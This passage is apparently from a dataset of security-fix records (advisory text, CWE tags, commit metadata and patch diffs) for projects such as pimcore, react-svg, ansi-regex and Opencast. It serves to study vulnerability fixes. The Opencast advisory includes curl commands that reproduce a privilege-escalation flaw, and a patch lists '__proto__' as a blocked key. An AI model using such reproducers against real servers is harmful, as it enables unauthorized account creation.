scripting","published_date":"2022-01-28","chain_len":1,"project":"https:\/\/github.com\/pimcore\/pimcore","commit_href":"https:\/\/github.com\/pimcore\/pimcore\/commit\/832c34aeb9f21f213295a0c28377132df996352a","commit_sha":"832c34aeb9f21f213295a0c28377132df996352a","patch":"SINGLE","chain_ord":"['832c34aeb9f21f213295a0c28377132df996352a']","before_first_fix_commit":"{'e94591dd8f5006452667a04c93e4422b05234eea'}","last_fix_commit":"832c34aeb9f21f213295a0c28377132df996352a","chain_ord_pos":1.0,"commit_datetime":"01\/26\/2022, 13:08:27","message":"added escape function to the icon field","author":"Jia Jia Ji","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'bundles\/AdminBundle\/Controller\/Admin\/DataObject\/ClassController.php': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/pimcore\/pimcore\/raw\/832c34aeb9f21f213295a0c28377132df996352a\/bundles%2FAdminBundle%2FController%2FAdmin%2FDataObject%2FClassController.php', 'patch': \"@@ -119,7 +119,7 @@ public function getTreeAction(Request $request)\\n                 'id' => $class->getId(),\\n                 'text' => $text,\\n                 'leaf' => true,\\n-                'icon' => $class->getIcon() ? $class->getIcon() : $defaultIcon,\\n+                'icon' => $class->getIcon() ? htmlspecialchars($class->getIcon()) : $defaultIcon,\\n                 'cls' => 'pimcore_class_icon',\\n                 'propertyVisibility' => $class->getPropertyVisibility(),\\n                 'enableGridLocking' => $class->isEnableGridLocking(),\"}}","message_norm":"added escape function to the icon field","language":"en","entities":"[('added', 'ACTION', ''), ('escape', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['bundles\/AdminBundle\/Controller\/Admin\/DataObject\/ClassController.php'])","num_files":1.0},{"index":1285,"vuln_id":"GHSA-8xqr-4cpm-wx7g","cwe_id":"{'CWE-79'}","score":0.0,"chain":"{'https:\/\/github.com\/tanem\/react-svg\/pull\/57\/commits\/ec7de5d678f53a085cee1348cb1aa069c9fc42fb'}","dataset":"osv","summary":"Cross-Site Scripting in react-svg Versions of `react-svg` before 2.2.18 are vulnerable to cross-site scripting (xss). This is due to the fact that scripts found in SVG files are run by default.\n\n\n## Recommendation\n\nUpdate to version 2.2.18 or later.","published_date":"2019-05-31","chain_len":1,"project":"https:\/\/github.com\/tanem\/react-svg","commit_href":"https:\/\/github.com\/tanem\/react-svg\/pull\/57\/commits\/ec7de5d678f53a085cee1348cb1aa069c9fc42fb","commit_sha":"ec7de5d678f53a085cee1348cb1aa069c9fc42fb","patch":"SINGLE","chain_ord":"['ec7de5d678f53a085cee1348cb1aa069c9fc42fb']","before_first_fix_commit":"{'9fa13da92cc4c44a10b6e2aced023d3199e8c6bb'}","last_fix_commit":"ec7de5d678f53a085cee1348cb1aa069c9fc42fb","chain_ord_pos":1.0,"commit_datetime":"04\/21\/2018, 18:37:51","message":"Changed default evalScripts prop to match documentation.","author":"Ron Perris","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'src\/index.js': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tanem\/react-svg\/raw\/ec7de5d678f53a085cee1348cb1aa069c9fc42fb\/src%2Findex.js', 'patch': \"@@ -10,7 +10,7 @@ export default class ReactSVG extends React.Component {\\n   static defaultProps = {\\n     callback: () => {},\\n     className: null,\\n-    evalScripts: 'once',\\n+    evalScripts: 'never',\\n     style: {},\\n     wrapperClassName: null\\n   }\"}}","message_norm":"changed default evalscripts prop to match documentation.","language":"en","entities":"[('changed', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/index.js'])","num_files":1.0},{"index":1294,"vuln_id":"GHSA-92v9-xh2q-fq9f","cwe_id":"{'CWE-1321', 'CWE-915'}","score":8.6,"chain":"{'https:\/\/github.com\/tony-tsx\/cookiex-deep\/commit\/b5bea2b7f34a5fa9abb4446cbd038ecdbcd09c88'}","dataset":"osv","summary":"Prototype Pollution in @cookiex\/deep The npm @cookiex\/deep package before version 0.0.7 has a prototype pollution vulnerability. The global proto object can be polluted using the __proto__ object.","published_date":"2021-09-20","chain_len":1,"project":"https:\/\/github.com\/tony-tsx\/cookiex-deep","commit_href":"https:\/\/github.com\/tony-tsx\/cookiex-deep\/commit\/b5bea2b7f34a5fa9abb4446cbd038ecdbcd09c88","commit_sha":"b5bea2b7f34a5fa9abb4446cbd038ecdbcd09c88","patch":"SINGLE","chain_ord":"['b5bea2b7f34a5fa9abb4446cbd038ecdbcd09c88']","before_first_fix_commit":"{'ed91f5d004e8a1e3f269bb48c3b2ac294f8580ef'}","last_fix_commit":"b5bea2b7f34a5fa9abb4446cbd038ecdbcd09c88","chain_ord_pos":1.0,"commit_datetime":"09\/13\/2021, 18:04:49","message":"fix: prototype pollution fix #1","author":"Tony","comments":null,"stats":"{'additions': 2, 'deletions': 2, 'total': 4}","files":"{'src\/assigner.ts': {'additions': 2, 'deletions': 2, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tony-tsx\/cookiex-deep\/raw\/b5bea2b7f34a5fa9abb4446cbd038ecdbcd09c88\/src%2Fassigner.ts', 'patch': \"@@ -1,12 +1,12 @@\\n const untracker = [ undefined, null ]\\n-\\n+const invalids = [ '__proto__', 'constructor', 'prototype' ]\\n const Assigner = function( delegate: ( a: any, b: any ) => any, useuntrack: boolean = true ): ( ...args: any[] ) => any {\\n   const assigner = ( ...args: any[] ) => {\\n-    console.log( { args } )\\n     return args.reduce( ( a, b ) => {\\n       if ( untracker.includes( a ) ) throw new TypeError( `can't convert ${a} to object` )\\n       if ( useuntrack && untracker.includes( b ) ) return a\\n       Object.keys( b ).forEach( key => {\\n+        if ( invalids.includes( key ) ) return void 0\\n         if ( untracker.includes( a[key] ) ) a[key] = b[key]\\n         else a[key] = delegate.call( this, a[key], b[key] )\\n       } )\"}}","message_norm":"fix: prototype pollution fix #1","language":"fr","entities":"[('prototype pollution', 'SECWORD', ''), ('#1', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/assigner.ts'])","num_files":1.0},{"index":1298,"vuln_id":"GHSA-92vm-wfm5-mxvv","cwe_id":"{'CWE-362'}","score":4.4,"chain":"{'https:\/\/github.com\/tj\/node-cookie-signature\/commit\/39791081692e9e14aa62855369e1c7f80fbfd50e', 'https:\/\/github.com\/tj\/node-cookie-signature\/commit\/2c4df6b6cee540f30876198cd0b5bebf28528c07', 'https:\/\/github.com\/tj\/node-cookie-signature\/commit\/4cc5e21e7f59a4ea0b51cd5e9634772d48fab590'}","dataset":"osv","summary":"cookie-signature Timing Attack Affected versions of `cookie-signature` are vulnerable to timing attacks as a result of using a fail-early comparison instead of a constant-time comparison. \n\nTiming attacks remove the exponential increase in entropy gained from increased secret length, by providing per-character feedback on the correctness of a guess via miniscule timing differences.\n\nUnder favorable network conditions, an attacker can exploit this to guess the secret in no more than `charset*length` guesses, instead of `charset^length` guesses required were the timing attack not present. \n\n\n\n## Recommendation\n\nUpdate to 1.0.4 or later.","published_date":"2020-01-06","chain_len":3,"project":"https:\/\/github.com\/tj\/node-cookie-signature","commit_href":"https:\/\/github.com\/tj\/node-cookie-signature\/commit\/4cc5e21e7f59a4ea0b51cd5e9634772d48fab590","commit_sha":"4cc5e21e7f59a4ea0b51cd5e9634772d48fab590","patch":"MULTI","chain_ord":"['4cc5e21e7f59a4ea0b51cd5e9634772d48fab590', '39791081692e9e14aa62855369e1c7f80fbfd50e', '2c4df6b6cee540f30876198cd0b5bebf28528c07']","before_first_fix_commit":"{'39791081692e9e14aa62855369e1c7f80fbfd50e'}","last_fix_commit":"2c4df6b6cee540f30876198cd0b5bebf28528c07","chain_ord_pos":1.0,"commit_datetime":"06\/25\/2014, 22:09:31","message":"Merge pull request #17 from tenbits\/patch-1\n\nFix #15: use sha1 hashes for double signing","author":"Nathan Vander Wilt","comments":null,"stats":"{'additions': 9, 'deletions': 1, 'total': 10}","files":"{'index.js': {'additions': 9, 'deletions': 1, 'changes': 10, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tj\/node-cookie-signature\/raw\/4cc5e21e7f59a4ea0b51cd5e9634772d48fab590\/index.js', 'patch': \"@@ -39,5 +39,13 @@ exports.unsign = function(val, secret){\\n   var str = val.slice(0, val.lastIndexOf('.'))\\n     , mac = exports.sign(str, secret);\\n   \\n-  return exports.sign(mac, secret) == exports.sign(val, secret) ? str : false;\\n+  return sha1(mac) == sha1(val) ? str : false;\\n };\\n+\\n+\/**\\n+ * Private\\n+ *\/\\n+\\n+function sha1(str){\\n+  return crypto.createHash('sha1').update(str).digest('hex');\\n+}\"}}","message_norm":"merge pull request #17 from tenbits\/patch-1\n\nfix #15: use sha1 hashes for double signing","language":"en","entities":"[('#17', 'ISSUE', ''), ('fix', 'ACTION', ''), ('#15', 'ISSUE', ''), ('signing', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['index.js'])","num_files":1.0},{"index":1300,"vuln_id":"GHSA-934w-hvj4-7fr6","cwe_id":"{'CWE-22'}","score":6.5,"chain":"{'https:\/\/github.com\/jsreport\/jsreport-chrome-pdf\/commit\/6750b2f77d05cb843aefc1c4a98097a3bd33a6a2'}","dataset":"osv","summary":"Path Traversal in jsreport-chrome-pdf This affects the package jsreport-chrome-pdf before 1.10.0.","published_date":"2021-04-13","chain_len":1,"project":"https:\/\/github.com\/jsreport\/jsreport-chrome-pdf","commit_href":"https:\/\/github.com\/jsreport\/jsreport-chrome-pdf\/commit\/6750b2f77d05cb843aefc1c4a98097a3bd33a6a2","commit_sha":"6750b2f77d05cb843aefc1c4a98097a3bd33a6a2","patch":"SINGLE","chain_ord":"['6750b2f77d05cb843aefc1c4a98097a3bd33a6a2']","before_first_fix_commit":"{'ba51764dae68403893f9f0e0ce7d060b78ee26c4'}","last_fix_commit":"6750b2f77d05cb843aefc1c4a98097a3bd33a6a2","chain_ord_pos":1.0,"commit_datetime":"10\/30\/2020, 16:09:42","message":"block file requests","author":"BJR Matos","comments":null,"stats":"{'additions': 19, 'deletions': 0, 'total': 19}","files":"{'lib\/conversion.js': {'additions': 19, 'deletions': 0, 'changes': 19, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/jsreport\/jsreport-chrome-pdf\/raw\/6750b2f77d05cb843aefc1c4a98097a3bd33a6a2\/lib%2Fconversion.js', 'patch': \"@@ -38,6 +38,12 @@ module.exports = async ({ reporter, getBrowser, htmlUrl, strategy, timeout, req,\\n       return\\n     }\\n \\n+    await page.setRequestInterception(true)\\n+\\n+    if (executionInfo.error) {\\n+      return\\n+    }\\n+\\n     page.on('pageerror', (err) => {\\n       pageLog('warn', `Page error: ${err.message}${err.stack ? ` , stack: ${err.stack}` : ''}`)\\n     })\\n@@ -64,6 +70,19 @@ module.exports = async ({ reporter, getBrowser, htmlUrl, strategy, timeout, req,\\n       }\\n \\n       pageLog('debug', `Page request: ${r.method()} (${r.resourceType()}) ${trimUrl(r.url())}${detail}`)\\n+\\n+      const isRelativeToHtmlUrl = r.url().lastIndexOf(htmlUrl, 0) === 0\\n+\\n+      if (\\n+        !isRelativeToHtmlUrl &&\\n+        \/\/ potentially dangerous request to local file\\n+        r.url().lastIndexOf('file:\/\/\/', 0) === 0\\n+      ) {\\n+        r.abort('accessdenied')\\n+        return\\n+      }\\n+\\n+      r.continue()\\n     })\\n \\n     page.on('requestfinished', (r) => {\"}}","message_norm":"block file requests","language":"fr","entities":null,"classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/conversion.js'])","num_files":1.0},{"index":1305,"vuln_id":"GHSA-93q8-gq69-wqmw","cwe_id":"{'CWE-697', 'CWE-1333'}","score":7.5,"chain":"{'https:\/\/github.com\/chalk\/ansi-regex\/commit\/8d1d7cdb586269882c4bdc1b7325d0c58c8f76f9'}","dataset":"osv","summary":"Inefficient Regular Expression Complexity in chalk\/ansi-regex ansi-regex is vulnerable to Inefficient Regular Expression Complexity which could lead to a denial of service.","published_date":"2021-09-20","chain_len":1,"project":"https:\/\/github.com\/chalk\/ansi-regex","commit_href":"https:\/\/github.com\/chalk\/ansi-regex\/commit\/8d1d7cdb586269882c4bdc1b7325d0c58c8f76f9","commit_sha":"8d1d7cdb586269882c4bdc1b7325d0c58c8f76f9","patch":"SINGLE","chain_ord":"['8d1d7cdb586269882c4bdc1b7325d0c58c8f76f9']","before_first_fix_commit":"{'c1b5e45f7c65a332ffb03ac8e5804ad37c579cdc'}","last_fix_commit":"8d1d7cdb586269882c4bdc1b7325d0c58c8f76f9","chain_ord_pos":1.0,"commit_datetime":"09\/10\/2021, 20:23:24","message":"Fix potential ReDoS (#37)","author":"Yeting Li","comments":"{'com_1': {'author': 'BeigeBox', 'datetime': '09\/23\/2021, 21:00:58', 'body': \"Which versions of ansi-regex are impacted by this vulnerability?  Several scanners are flagging all versions of this library other than 5.0.1 and 6.0.1.  I suspect some of the older versions aren't impacted, because the pattern variable is different (just spot checked I think v2.1.1 and v3).\"}, 'com_2': {'author': 'Qix-', 'datetime': '09\/26\/2021, 15:10:07', 'body': \"Not sure because the security researchers are not doing their due diligence and are instead farming bounty money on e.g. huntr.dev, targeting the most used repositories for clout.\\r\\n\\r\\nI'm really not sure what to do about this and it's eating a lot of time away. The vulnerability itself is not major - unless you're allowing long AND unsanitized user input to hit the API directly, the vulnerability doesn't affect you.\\r\\n\\r\\nI have no idea which versions it actually affects because they didn't test it correctly.\"}, 'com_3': {'author': 'thoger', 'datetime': '09\/27\/2021, 18:07:58', 'body': \"Confirmed 4.1.0 and 3.0.0 as affected testing using the provided reproducer.  2.1.1 does not reproduce the issue.\\r\\n\\r\\n3.0.0 is the first affected, as that's the first version that includes 69bebf6b8 that the problematic part of the regex.\"}, 'com_4': {'author': 'Qix-', 'datetime': '09\/27\/2021, 18:22:35', 'body': 'Thank you @thoger. \ud83d\ude42'}, 'com_5': {'author': 'arungpro', 'datetime': '10\/12\/2021, 11:28:32', 'body': '@thoger Does 5.0.0 or above, are not affected this? Can you confirm on the same?'}, 'com_6': {'author': 'Qix-', 'datetime': '10\/12\/2021, 11:51:24', 'body': '@arungpro `5.0.0` is affected, `5.0.1` is not. Likewise, `6.0.0` is affected, `6.0.1` is not.'}, 'com_7': {'author': 'OnlineCop', 'datetime': '01\/10\/2022, 17:01:46', 'body': 'Would someone be able to help me understand the exact formatting going on here?\\r\\n\\r\\nI assume that the `\\\\` backslashes are escaped because this is within a string, meaning `\\\\u001B` must be represented as `\\\\\\\\u001B` ?\\r\\n\\r\\nI copied the \"proposed\" escaped original into [regex101](https:\/\/regex101.com\/r\/UR7Ma5\/1) and removed the escape characters to produce this:\\r\\n\\r\\n```[\\\\u001B\\\\u009B][[\\\\]()#;?]*(?:(?:(?:(?:;[-a-zA-Z\\\\d\\\\\/#&.:=?%@~_]+)*|[a-zA-Z\\\\d]+(?:;[-a-zA-Z\\\\d\\\\\/#&.:=?%@~_]*)*)?\\\\u0007)```\\r\\n\\r\\nI then plugged that unescaped version [back in](https:\/\/regex101.com\/r\/UR7Ma5\/2) to determine whether there were any problems with the pattern itself, and see that there is an incomplete\/unclosed `(?:` which should probably be removed:\\r\\n\\r\\n```[\\\\u001B\\\\u009B][[\\\\]()#;?]*(?:(?:;[-a-zA-Z\\\\d\\\\\/#&.:=?%@~_]+)*|[a-zA-Z\\\\d]+(?:;[-a-zA-Z\\\\d\\\\\/#&.:=?%@~_]*)*)?\\\\u0007```\\r\\n\\r\\nThe next outer `(?: ... )` group appears to have no alternations or quantifiers, so can probably also be removed:\\r\\n\\r\\n```(?:(?:;[-a-zA-Z\\\\d\\\\\/#&.:=?%@~_]+)*|[a-zA-Z\\\\d]+(?:;[-a-zA-Z\\\\d\\\\\/#&.:=?%@~_]*)*)?\\\\u0007)```\\r\\n\\r\\nThe next `(?: ... | ... )?` group does contain an alternation, and is qualified by its `?` quantifier. Immediately after this optional group, it looks for `\\\\u0007` at the end.\\r\\n\\r\\nWithin both alternations, the character groups `[-a-zA-Z\\\\d\\\\\/#&.:=?%@~_]` can be shortened: `[a-zA-Z0-9_]` or `[a-zA-Z\\\\d_]` can be replaced with `\\\\w`, so: `[-\\\\w\\\\\/#&.:=?%@~]`.\\r\\n\\r\\nThat would look like this:\\r\\n\\r\\n```[\\\\u001B\\\\u009B][[\\\\]()#;?]*(?:(?:;[-\\\\w\\\\\/#&.:=?%@~]+)*|[a-zA-Z\\\\d]+(?:;[-\\\\w\\\\\/#&.:=?%@~]*)*)?\\\\u0007```\\r\\n\\r\\nSo, within the first alternation, it matches a semicolon `;` followed by **one** or more of those character-group characters. Within the second alternation, it first looks for letters or numbers, followed by any number of semicolon `;` followed by **zero** or more of those character-group characters. I\\'m not sure whether that would want to be a `+` one-or-more, since that would allow \"abc;;;;;;;;;\" to match there instead of requiring characters between those semicolons.\\r\\n\\r\\nIf you look at [this example](https:\/\/regex101.com\/r\/UR7Ma5\/3), I\\'ve changed the outer non-capturing `(?: ... )?` to a capturing group just for illustrative purposes so you can see how the semicolon is matched in one case but not in the other due to this **zero** or more quantifiers. You can see this when the semicolon is added to the text in [this next example](https:\/\/regex101.com\/r\/UR7Ma5\/4).\\r\\n\\r\\nIf both `;[-\\\\w\\\\\/#&.:=?%@~]` character groups are quantified with zero-or-more `*`, then subsequent semicolons `;;` will match, while if they are quantified with one-or-more `+`, the match fails due to subsequent semicolons `;;`.'}, 'com_8': {'author': 'lorand-horvath', 'datetime': '04\/02\/2022, 07:47:22', 'body': 'ansi-regex v3 and v4 should now include the vulnerability fixes:\\r\\n`3.0.1` in https:\/\/github.com\/chalk\/ansi-regex\/commit\/419250fa510bf31b4cc672e76537a64f9332e1f1 and https:\/\/github.com\/chalk\/ansi-regex\/commit\/c57d4c2fdbe0357a0f6dd42d1160defdc9fffdf5\\r\\n`4.1.1` in https:\/\/github.com\/chalk\/ansi-regex\/commit\/75a657da7af875b2e2724fd6331bf0a4b23d3c9a'}, 'com_9': {'author': 'romans-ovo', 'datetime': '07\/13\/2022, 15:36:46', 'body': '> ansi-regex v3 and v4 should now include the vulnerability fixes: `3.0.1` in [419250f](https:\/\/github.com\/chalk\/ansi-regex\/commit\/419250fa510bf31b4cc672e76537a64f9332e1f1) and [c57d4c2](https:\/\/github.com\/chalk\/ansi-regex\/commit\/c57d4c2fdbe0357a0f6dd42d1160defdc9fffdf5) `4.1.1` in [75a657d](https:\/\/github.com\/chalk\/ansi-regex\/commit\/75a657da7af875b2e2724fd6331bf0a4b23d3c9a)\\r\\n\\r\\nNeither 3.0.1, nor 4.1.1 are listed on https:\/\/www.npmjs.com\/package\/ansi-regex (under Versions), btw.'}, 'com_10': {'author': 'Qix-', 'datetime': '07\/13\/2022, 15:42:41', 'body': '<img width=\"614\" alt=\"image\" src=\"https:\/\/user-images.githubusercontent.com\/885648\/178775021-919b8738-8879-4edc-8507-a6b2475c5631.png\">\\r\\nYou sure?'}, 'com_11': {'author': 'papb', 'datetime': '08\/01\/2022, 02:05:09', 'body': \"> Would someone be able to help me understand the exact formatting going on here?\\r\\n\\r\\n@OnlineCop can you first help me understand what exactly is your question here? Are you trying to understand what the code is doing? Are you proposing a readability improvement? Or performance improvement? Sorry, you said a lot of things but I couldn't even understand what is your goal, roughly...\\r\\n\\r\\n> I assume that the `\\\\` backslashes are escaped because this is within a string, meaning `\\\\u001B` must be represented as `\\\\\\\\u001B` ?\\r\\n\\r\\nYes, exactly.\"}, 'com_12': {'author': 'OnlineCop', 'datetime': '08\/01\/2022, 14:23:36', 'body': \"In the original, lines 2-5 were looking for:\\r\\n1. either `\\\\u001B` (ESC) or `\\\\u009B` (\u00a2 cent sign) followed by 0 or more of these characters: `[]()#;?`\\r\\n\\r\\nAfter that, it was looking for either:\\r\\n2. any number of letters, numbers, semi-colons, or special characters that came before `\\\\u0007` (BEL)\\r\\n    - There were a _lot_ of 0-or-more groups, all of which was also within its own `(?:...)?` 0-or-1 (optional) group, before that BEL.\\r\\n    - It was definitely something that could cause ReDoS.\\r\\n3. or an optional group of digits and semi-colons, followed by a single character in the range `[\\\\dA-PR-TZcf-ntqry=><~]`.\\r\\n    - This optional group also had potential for a ReDoS.\\r\\n\\r\\nIn the revised version, lines 2-5 were looking for the same characters as 1. above, but increased the variety of characters allowed before `\\\\u0007` and still has a lot of potential for ReDoS (possibly more than before).\\r\\n\\r\\nI don't understand what exactly is supposed to be matched here. Both BEFORE and AFTER versions have a high probability to cause catastrophic backtracking. Are there any tests that should match either of the BEFORE or AFTER regexes?\"}, 'com_13': {'author': 'Qix-', 'datetime': '08\/02\/2022, 22:47:38', 'body': \"Feel free to create a reproduction case that exploits exponential time complexity and file an issue. Otherwise I'm not sure what you're trying to say.\"}}","stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'index.js': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/chalk\/ansi-regex\/raw\/8d1d7cdb586269882c4bdc1b7325d0c58c8f76f9\/index.js', 'patch': \"@@ -1,6 +1,6 @@\\n export default function ansiRegex({onlyFirst = false} = {}) {\\n \\tconst pattern = [\\n-\\t\\t'[\\\\\\\\u001B\\\\\\\\u009B][[\\\\\\\\]()#;?]*(?:(?:(?:[a-zA-Z\\\\\\\\d]*(?:;[-a-zA-Z\\\\\\\\d\\\\\\\\\/#&.:=?%@~_]*)*)?\\\\\\\\u0007)',\\n+\\t    '[\\\\\\\\u001B\\\\\\\\u009B][[\\\\\\\\]()#;?]*(?:(?:(?:(?:;[-a-zA-Z\\\\\\\\d\\\\\\\\\/#&.:=?%@~_]+)*|[a-zA-Z\\\\\\\\d]+(?:;[-a-zA-Z\\\\\\\\d\\\\\\\\\/#&.:=?%@~_]*)*)?\\\\\\\\u0007)',\\n \\t\\t'(?:(?:\\\\\\\\d{1,4}(?:;\\\\\\\\d{0,4})*)?[\\\\\\\\dA-PR-TZcf-ntqry=><~]))'\\n \\t].join('|');\"}}","message_norm":"fix potential redos (#37)","language":"ca","entities":"[('fix', 'ACTION', ''), ('redos', 'SECWORD', ''), ('#37', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['index.js'])","num_files":1.0},{"index":1314,"vuln_id":"GHSA-94qw-r73x-j7hg","cwe_id":"{'CWE-285'}","score":4.8,"chain":"{'https:\/\/github.com\/opencast\/opencast\/commit\/72fad0031d8a82c860e2bde0b27570c5042320ee'}","dataset":"osv","summary":"Users with ROLE_COURSE_ADMIN can create new users in Opencast ### Impact\n\nUsers with the role `ROLE_COURSE_ADMIN` can use the user-utils endpoint to create new users not including the role `ROLE_ADMIN`. For example:\n\n```bash\n# Use the admin to create a new user with ROLE_COURSE_ADMIN using the admin user.\n# We expect this to work.\n% curl -i -u admin:opencast 'https:\/\/example.opencast.org\/user-utils\/xy.json' -X PUT \\\n  --data 'password=f&roles=%5B%22ROLE_COURSE_ADMIN%22%5D'\nHTTP\/2 201\n\n# Use the new user to create more new users.\n# We don't exp\u00fcect a user with just role ROLE_COURSE_ADMIN to succeed.\n# But it does work\n% curl -i -u xy:f 'https:\/\/example.opencast.org\/user-utils\/ab.json' -X PUT \\\n  --data 'password=f&roles=%5B%22ROLE_COURSE_ADMIN%22%5D'\nHTTP\/2 201\n```\n`ROLE_COURSE_ADMIN` is a non-standard role in Opencast which is referenced neither in the documentation nor in any code (except for tests) but only in the security configuration. From the name \u2013 implying an admin for a specific course \u2013 users would never expect that this role allows user creation.\n\n### Patches\n\nThis issue is fixed in 7.6 and 8.1 which both ship a new default security configuration.\n\n### Workarounds\n\nYou can fix this issue by removing all instances of `ROLE_COURSE_ADMIN` in your organization's security configuration (`etc\/security\/mh_default_org.xml` by default).\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n- Open an issue in [opencast\/opencast](https:\/\/github.com\/opencast\/opencast\/issues)\n- For security-relevant information, email us at security@opencast.org","published_date":"2020-01-30","chain_len":1,"project":"https:\/\/github.com\/opencast\/opencast","commit_href":"https:\/\/github.com\/opencast\/opencast\/commit\/72fad0031d8a82c860e2bde0b27570c5042320ee","commit_sha":"72fad0031d8a82c860e2bde0b27570c5042320ee","patch":"SINGLE","chain_ord":"['72fad0031d8a82c860e2bde0b27570c5042320ee']","before_first_fix_commit":"{'b157e1fb3b35991ca7bf59f0730329fbe7ce82e8'}","last_fix_commit":"72fad0031d8a82c860e2bde0b27570c5042320ee","chain_ord_pos":1.0,"commit_datetime":"01\/16\/2020, 15:40:23","message":"Remove ROLE_COURSE_ADMIN\n\nUsers with the role `ROLE_COURSE_ADMIN` can use the user-utils endpoint\nto create new users not including the role ROLE_ADMIN. For example:\n\n```sh\n% curl -i -u admin:opencast 'https:\/\/example.opencast.org\/user-utils\/xy.json' -X PUT \\\n  --data 'password=f&roles=%5B%22ROLE_COURSE_ADMIN%22%5D'\nHTTP\/2 201\n\n% curl -i -u xy:f 'https:\/\/example.opencast.org\/user-utils\/ab.json' -X PUT \\\n  --data 'password=f&roles=%5B%22ROLE_COURSE_ADMIN%22%5D'\nHTTP\/2 201\n```\n\n`ROLE_COURSE_ADMIN` is a non-standard role in Opencast which is\nreferenced neither in the documentation nor in any code (except for\ntests) but only in the security configuration. From the name \u2013 implying\nan admin for a specific course \u2013 users would never expect that this role\nallows user creation.\n\nThis patch fixes the problem by dropping the default access rules for\n`ROLE_COURSE_ADMIN`. Users which use and need this custom role can\neasily configure this specific to their needs. There is no reason to\nship this by default.","author":"Lars Kiesow","comments":null,"stats":"{'additions': 5, 'deletions': 5, 'total': 10}","files":"{'etc\/security\/mh_default_org.xml': {'additions': 5, 'deletions': 5, 'changes': 10, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/opencast\/opencast\/raw\/72fad0031d8a82c860e2bde0b27570c5042320ee\/etc%2Fsecurity%2Fmh_default_org.xml', 'patch': '@@ -297,11 +297,11 @@\\n     <sec:intercept-url pattern=\"\/transcripts\/watson\/results*\" method=\"POST\" access=\"ROLE_ANONYMOUS\" \/>\\n \\n     <!-- Everything else is for the admin users -->\\n-    <sec:intercept-url pattern=\"\/admin-ng\" method=\"GET\" access=\"ROLE_ADMIN, ROLE_ADMIN_UI, ROLE_COURSE_ADMIN\" \/>\\n-    <sec:intercept-url pattern=\"\/admin-ng\/\" method=\"GET\" access=\"ROLE_ADMIN, ROLE_ADMIN_UI, ROLE_COURSE_ADMIN\" \/>\\n-    <sec:intercept-url pattern=\"\/admin-ng\/index.html\" access=\"ROLE_ADMIN, ROLE_ADMIN_UI, ROLE_COURSE_ADMIN\" \/>\\n-    <sec:intercept-url pattern=\"\/index.html\" access=\"ROLE_ADMIN, ROLE_ADMIN_UI, ROLE_COURSE_ADMIN\" \/>\\n-    <sec:intercept-url pattern=\"\/**\" access=\"ROLE_ADMIN, ROLE_COURSE_ADMIN\" \/>\\n+    <sec:intercept-url pattern=\"\/admin-ng\" method=\"GET\" access=\"ROLE_ADMIN, ROLE_ADMIN_UI\" \/>\\n+    <sec:intercept-url pattern=\"\/admin-ng\/\" method=\"GET\" access=\"ROLE_ADMIN, ROLE_ADMIN_UI\" \/>\\n+    <sec:intercept-url pattern=\"\/admin-ng\/index.html\" access=\"ROLE_ADMIN, ROLE_ADMIN_UI\" \/>\\n+    <sec:intercept-url pattern=\"\/index.html\" access=\"ROLE_ADMIN, ROLE_ADMIN_UI\" \/>\\n+    <sec:intercept-url pattern=\"\/**\" access=\"ROLE_ADMIN\" \/>\\n \\n     <!-- ############################# -->\\n     <!-- # LOGIN \/ LOGOUT MECHANISMS # -->'}}","message_norm":"remove role_course_admin\n\nusers with the role `role_course_admin` can use the user-utils endpoint\nto create new users not including the role role_admin. for example:\n\n```sh\n% curl -i -u admin:opencast 'https:\/\/example.opencast.org\/user-utils\/xy.json' -x put \\\n  --data 'password=f&roles=%5b%22role_course_admin%22%5d'\nhttp\/2 201\n\n% curl -i -u xy:f 'https:\/\/example.opencast.org\/user-utils\/ab.json' -x put \\\n  --data 'password=f&roles=%5b%22role_course_admin%22%5d'\nhttp\/2 201\n```\n\n`role_course_admin` is a non-standard role in opencast which is\nreferenced neither in the documentation nor in any code (except for\ntests) but only in the security configuration. from the name \u2013 implying\nan admin for a specific course \u2013 users would never expect that this role\nallows user creation.\n\nthis patch fixes the problem by dropping the default access rules for\n`role_course_admin`. users which use and need this custom role can\neasily configure this specific to their needs. there is no reason to\nship this by default.","language":"en","entities":"[('remove', 'ACTION', ''), ('role_course_admin', 'SECWORD', ''), ('role_course_admin', 'SECWORD', ''), ('role_admin', 'SECWORD', ''), ('admin', 'SECWORD', ''), ('https:\/\/example.opencast.org\/user-utils\/xy.json', 'URL', ''), ('password', 'SECWORD', ''), ('f&roles=%5b%22role_course_admin%22%5d', 'SECWORD', ''), ('https:\/\/example.opencast.org\/user-utils\/ab.json', 'URL', ''), ('password', 'SECWORD', ''), ('f&roles=%5b%22role_course_admin%22%5d', 'SECWORD', ''), ('role_course_admin', 'SECWORD', ''), ('security', 'SECWORD', ''), ('admin', 'SECWORD', ''), ('fixes', 'ACTION', ''), ('problem', 'FLAW', ''), ('role_course_admin', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['etc\/security\/mh_default_org.xml'])","num_files":1.0},{"index":1321,"vuln_id":"GHSA-95hx-62rh-gg96","cwe_id":"{'CWE-79'}","score":8.0,"chain":"{'https:\/\/github.com\/PrestaShop\/contactform\/commit\/ecd9f5d14920ec00885766a7cb41bcc5ed8bfa09'}","dataset":"osv","summary":"Potential XSS injection In PrestaShop contactform ### Impact\nAn attacker is able to inject javascript while using the contact form. \n\n### Patches\nThe problem is fixed in 